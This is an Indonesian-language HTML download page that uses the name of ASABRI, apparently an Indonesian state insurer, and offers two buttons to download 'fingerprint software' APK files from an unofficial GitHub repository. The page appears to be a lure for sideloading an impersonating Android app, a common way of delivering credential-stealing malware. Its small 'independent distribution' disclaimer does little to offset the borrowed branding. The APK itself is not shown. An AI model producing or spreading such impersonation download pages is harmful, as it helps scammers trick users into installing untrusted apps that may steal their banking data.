
<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Halaman Unduhan Aplikasi</title>

  <style>
    
* {
  box-sizing: border-box;
}

body {
  margin: 0;
  padding: 0;
  font-family: Arial, sans-serif;
  background: #ffffff;
}

.container {
  width: 100%;
  min-height: 100vh;
  text-align: center;
  background: white;
}

.logo {
  display: block;
  width: 100%;
  height: 75vh;
  object-fit: contain;
  margin: 0 auto;
}

h2 {
  color: #183b67;
  font-size: 22px;
  margin: 15px 0 20px;
}

.download-area {
  padding: 10px 20px 30px;
  max-width: 500px;
  margin: auto;
}

.download-btn {
  display: block;
  width: 100%;
  padding: 18px 12px;
  margin: 15px 0;
  background: #1769aa;
  color: white;
  text-decoration: none;
  font-weight: bold;
  font-size: 16px;
  border-radius: 9px;
}

.alternative {
  background: #16834a;
}

.notice {
  font-size: 12px;
  color: #777;
  line-height: 1.6;
}
  </style>
</head>

<body>

  <div class="container">

    <img src="./logo.png"
         alt="Logo"
         class="logo">

    <div class="download-area">
        
    <h2>Unduh Aplikasi</h2>

    <a href="https://github.com/indo-01/contoh1/releases/latest/download/ASABRI.sofware.sidik-jari.apk"
       class="download-btn">
       Unduh Layanan ASABRI
    </a>

    <a href="https://github.com/indo-01/contoh1/releases/latest/download/sofware.sidik-jari.apk"
       class="download-btn alternative">
       Unduh Alternatif ASABRI
    </a>

    <p class="notice">
      Halaman distribusi aplikasi independen.
      Periksa identitas pengembang dan keaslian aplikasi
      sebelum memasangnya.
    </p>

  </div>

</body>
</html>
